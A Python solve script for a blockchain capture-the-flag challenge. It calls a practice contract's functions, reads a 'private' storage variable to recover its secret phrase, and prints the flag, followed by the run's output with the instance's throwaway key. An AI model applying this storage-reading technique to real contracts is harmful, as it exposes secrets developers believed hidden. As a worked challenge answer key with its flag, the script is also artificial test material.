from foundpy import config, Contract, ether

"""
Foundry documentation:
https://github.com/foundry-rs/foundry

Commands:
- Initialize new project: forge init
- Run tests: forge test -vvv
"""

# Retrieve the setup contract address from configuration.
SETUP_CONTRACT_ADDR = config.from_tcp1p("http://103.178.153.113:30001/")['setup_contract']


class Setup(Contract):
    def __init__(self) -> None:
        super().__init__(
            addr=SETUP_CONTRACT_ADDR,
            file="./Setup.sol",
        )

    @property
    def brief(self) -> str:
        """Return the brief address from the setup contract."""
        return self.contract.functions.brief().call()

    def is_solved(self) -> None:
        """Print whether the setup challenge is solved."""
        result = self.contract.functions.isSolved().call()
        print("Is solved:", result)


class Briefing(Contract):
    def __init__(self, address: str) -> None:
        super().__init__(address, "./Briefing.sol")

    def secret_phrase(self) -> str:
        """Retrieve the secret phrase from the briefing contract storage."""
        offset = self.get_private_variable_offset('secretPhrase')
        value = self.storage(offset)
        return value


def main() -> None:
    setup = Setup()
    brief = Briefing(setup.brief)

    tx_verify = brief.contract.functions.verifyCall().transact()
    print("verifyCall transaction:", tx_verify)

    tx_put = brief.contract.functions.putSomething(
        1337, "Casino Heist Player", config.wallet.address
    ).transact()
    print("putSomething transaction:", tx_put)

    tx_deposit = brief.contract.functions.firstDeposit().transact(
        transaction={"value": ether(5)}
    )
    print("firstDeposit transaction:", tx_deposit)

    tx_receive = brief.contract.receive().transact(
        transaction={"value": ether(1)}
    )
    print("receive transaction:", tx_receive)

    secret = brief.secret_phrase()
    print("Secret phrase:", secret)

    tx_finalize = brief.contract.functions.Finalize(secret).transact()
    print("Finalize transaction:", tx_finalize)

    setup.is_solved()
    print("Flag:", config.flag())


if __name__ == "__main__":
    main()

"""
Output:
solving PoW: s.AAAnEA==.ZGSmI5wnbmgoxoUZr/oINg==
100%|██████████████████████████████████████████████████████████████████████████████| 10000/10000 [00:32<00:00, 308.34it/s]
PoW done
UUID: ad31dd7e-081e-48e7-85d7-9cc204a63714
RPC Endpoint: http://103.178.153.113:30001//ad31dd7e-081e-48e7-85d7-9cc204a63714
Private Key: 0x2e0e97016bb5d9b0a7b080d484c4427884f05676c4baeb90b8f6cb95e20cb890
Setup Contract: 0xdE701c17b25090A91bfc3E7f99BCe3449B9A7885
Wallet: 0x451DedC905D603A072BCb7535090Ae2c07b6627c
Message: your private blockchain has been deployed, it will automatically terminate in 30 minutes
verifyCall transaction: b'g\xbdu\x8c\xa4\x05\xc4Iw\xa3\xc7\xc9`\x8f\xc8\xc5\x9cb\xceH\x86\x9b\xfe\xfd@\xed\xcc@\xf0\x1bj\xdf'
putSomething transaction: b'\xe1\x8a*\x8d`c\x0f\xed\x90\xdf?\xfaT\xb9J\xc8\xba\xb9 \xff\x8f\x1e|\xca\x12e\x86\xee\xc3\xb4\xae\xc7'
firstDeposit transaction: b'\x10$E\n\x9c\xa9\x84l\xeb\xae\xb9v\x94\xd3\x0e3\x83\x94@L\xef\xd8]\xff\xfb\x16Av-@U\xfb'
receive transaction: b'\x8f\x8f\x83T\x14t\xaa\x8c\x17G\xf1\x00\x85,\xc2\x0b\xfc\x1e(\xf3\n\xcd"\xb5sg\xf8\x97\x90e4\xf6'
Secret phrase: b'NowYouKnowStorageIsNotThatSafe..'
Finalize transaction: b'\xe4\xf4\x97\xf3\x86H\xdd\xd2\x1c\xa8\xb7\x95\xa8\r\xab\xba\x07\xb2_=\x06\xbe"\xc4\x98\xc4\x82\x04\r\xfd\xbc\xcc'
Is solved: True
Flag: ENUMA{Briefing_completed!_Now_Gearing_up!}
"""